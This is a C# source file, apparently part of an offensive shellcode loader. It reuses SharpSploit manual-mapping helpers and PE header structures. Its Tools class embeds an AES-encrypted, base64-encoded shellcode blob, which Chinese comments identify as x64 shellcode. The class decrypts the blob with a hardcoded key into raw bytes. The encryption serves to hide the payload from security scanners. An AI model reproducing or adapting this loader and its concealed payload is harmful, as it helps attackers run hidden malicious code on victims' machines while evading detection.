using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;


namespace MessyTools
{
    class SharpSploit_Execution_ManualMap_Map
    {
        public static IntPtr AllocateFileToMemory(string FilePath)
        {
            if (!File.Exists(FilePath))
            {
                throw new InvalidOperationException("Filepath not found.");
            }

            byte[] bFile = File.ReadAllBytes(FilePath);
            return AllocateBytesToMemory(bFile);
        }

        public static IntPtr AllocateBytesToMemory(byte[] FileByteArray)
        {
            IntPtr pFile = Marshal.AllocHGlobal(FileByteArray.Length);
            Marshal.Copy(FileByteArray, 0, pFile, FileByteArray.Length);
            return pFile;
        }
    }

    class SharpSploit_Execution_ManualMap_PE
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct PE_META_DATA
        {
            public UInt32 Pe;
            public Boolean Is32Bit;
            public IMAGE_FILE_HEADER ImageFileHeader;
            public IMAGE_OPTIONAL_HEADER32 OptHeader32;
            public IMAGE_OPTIONAL_HEADER64 OptHeader64;
            public IMAGE_SECTION_HEADER[] Sections;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER32
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt32 BaseOfData;
            public UInt32 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt32 SizeOfStackReserve;
            public UInt32 SizeOfStackCommit;
            public UInt32 SizeOfHeapReserve;
            public UInt32 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt64 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt64 SizeOfStackReserve;
            public UInt64 SizeOfStackCommit;
            public UInt64 SizeOfHeapReserve;
            public UInt64 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;
            [FieldOffset(8)]
            public UInt32 VirtualSize;
            [FieldOffset(12)]
            public UInt32 VirtualAddress;
            [FieldOffset(16)]
            public UInt32 SizeOfRawData;
            [FieldOffset(20)]
            public UInt32 PointerToRawData;
            [FieldOffset(24)]
            public UInt32 PointerToRelocations;
            [FieldOffset(28)]
            public UInt32 PointerToLinenumbers;
            [FieldOffset(32)]
            public UInt16 NumberOfRelocations;
            [FieldOffset(34)]
            public UInt16 NumberOfLinenumbers;
            [FieldOffset(36)]
            public DataSectionFlags Characteristics;

            public string Section
            {
                get { return new string(Name); }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }

        [Flags]
        public enum DataSectionFlags : uint
        {
            TYPE_NO_PAD = 0x00000008,
            CNT_CODE = 0x00000020,
            CNT_INITIALIZED_DATA = 0x00000040,
            CNT_UNINITIALIZED_DATA = 0x00000080,
            LNK_INFO = 0x00000200,
            LNK_REMOVE = 0x00000800,
            LNK_COMDAT = 0x00001000,
            NO_DEFER_SPEC_EXC = 0x00004000,
            GPREL = 0x00008000,
            MEM_FARDATA = 0x00008000,
            MEM_PURGEABLE = 0x00020000,
            MEM_16BIT = 0x00020000,
            MEM_LOCKED = 0x00040000,
            MEM_PRELOAD = 0x00080000,
            ALIGN_1BYTES = 0x00100000,
            ALIGN_2BYTES = 0x00200000,
            ALIGN_4BYTES = 0x00300000,
            ALIGN_8BYTES = 0x00400000,
            ALIGN_16BYTES = 0x00500000,
            ALIGN_32BYTES = 0x00600000,
            ALIGN_64BYTES = 0x00700000,
            ALIGN_128BYTES = 0x00800000,
            ALIGN_256BYTES = 0x00900000,
            ALIGN_512BYTES = 0x00A00000,
            ALIGN_1024BYTES = 0x00B00000,
            ALIGN_2048BYTES = 0x00C00000,
            ALIGN_4096BYTES = 0x00D00000,
            ALIGN_8192BYTES = 0x00E00000,
            ALIGN_MASK = 0x00F00000,
            LNK_NRELOC_OVFL = 0x01000000,
            MEM_DISCARDABLE = 0x02000000,
            MEM_NOT_CACHED = 0x04000000,
            MEM_NOT_PAGED = 0x08000000,
            MEM_SHARED = 0x10000000,
            MEM_EXECUTE = 0x20000000,
            MEM_READ = 0x40000000,
            MEM_WRITE = 0x80000000
        }
    }

    class Tools
    {
        public static byte[] getSc()
        {
            string sc = "";

            // 利用IntPtr结构的Size属性来查看系统的位宽；前提是程序需要采用Any CPU的方式进行编辑
            if (IntPtr.Size == 8)
            {
                //x64
                sc = "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";
            }
            else if (IntPtr.Size == 4)
            {
                //x86，暂时也放x64的shellcode，不然更改位数这里获取不到会报错
                sc = "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";
            }

            // 解密并转换为byte[]
            List<byte> b = new List<byte>();
            foreach (var i in AesDecryptor_Base64(sc).Split(','))
            {
                b.Add((byte)int.Parse(i.Substring(2), System.Globalization.NumberStyles.HexNumber));
            }
            byte[] RLSXlbz = b.ToArray();

            return RLSXlbz;
        }

        /// <summary>
        /// AES解密.
        /// </summary>
        /// <param name="str">传入要解密的字符串.</param>
        /// <param name="key">支持的密钥长度为128/192/256位,默认长度256位; 默认秘钥为openopenopenopen,长度为128</param>
        /// <returns>返回解密后的字符串.</returns>
        public static string AesDecryptor_Base64(string str, string key = "openopenopenopen")
        {
            if (string.IsNullOrEmpty(str)) return null;

            byte[] toEncryptArray = Convert.FromBase64String(str);

            System.Security.Cryptography.RijndaelManaged rm = new System.Security.Cryptography.RijndaelManaged
            {
                Key = Encoding.UTF8.GetBytes(key),
                Mode = System.Security.Cryptography.CipherMode.ECB,
                Padding = System.Security.Cryptography.PaddingMode.PKCS7
            };

            System.Security.Cryptography.ICryptoTransform cTransform = rm.CreateDecryptor();
            byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);

            return Encoding.UTF8.GetString(resultArray);
        }
    }
}